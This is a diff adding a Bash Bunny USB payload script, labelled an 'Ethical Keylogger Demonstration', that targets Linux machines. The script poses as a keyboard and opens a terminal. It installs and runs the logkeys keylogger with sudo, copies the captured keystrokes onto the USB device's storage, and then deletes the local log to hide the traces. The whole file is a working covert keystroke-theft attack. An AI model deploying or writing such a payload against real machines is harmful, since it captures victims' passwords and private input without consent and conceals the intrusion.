@@ -1,0 +1,49 @@
+#!/bin/bash
+# Title: Ethical Keylogger Demonstration
+# Description: Capture keystrokes on a Linux machine using an open-source keylogger.
+# Author: jjarque1
+# Target: Linux
+# Payload developed for educational purposes only
+
+# Set up attack modes
+ATTACKMODE HID STORAGE
+
+# Delay to allow the system to recognize the USB device
+QUACK DELAY 2000
+
+# Open terminal (assumes shortcut Ctrl+Alt+T opens a terminal)
+QUACK CTRL ALT t
+QUACK DELAY 1000
+
+# Install 'logkeys' keylogger (ensure system has internet access for demo purposes)
+QUACK STRING sudo apt-get install -y logkeys
+QUACK ENTER
+QUACK DELAY 5000
+
+# Start the keylogger
+QUACK STRING sudo logkeys --start --output /tmp/keylog.txt
+QUACK ENTER
+QUACK DELAY 1000
+
+# Wait for a while to collect keystrokes
+QUACK DELAY 30000  # Adjust this delay based on how long you want the keylogger to run
+
+# Stop the keylogger
+QUACK STRING sudo logkeys --stop
+QUACK ENTER
+QUACK DELAY 1000
+
+# Copy the log file to Bash Bunny storage
+QUACK STRING cp /tmp/keylog.txt /media/$USER/BashBunny/keylog.txt
+QUACK ENTER
+QUACK DELAY 2000
+
+# Clean up the keylog file
+QUACK STRING rm /tmp/keylog.txt
+QUACK ENTER
+
+# Close the terminal
+QUACK CTRL d
+
+# Eject the USB Bash Bunny
+ATTACKMODE OFF
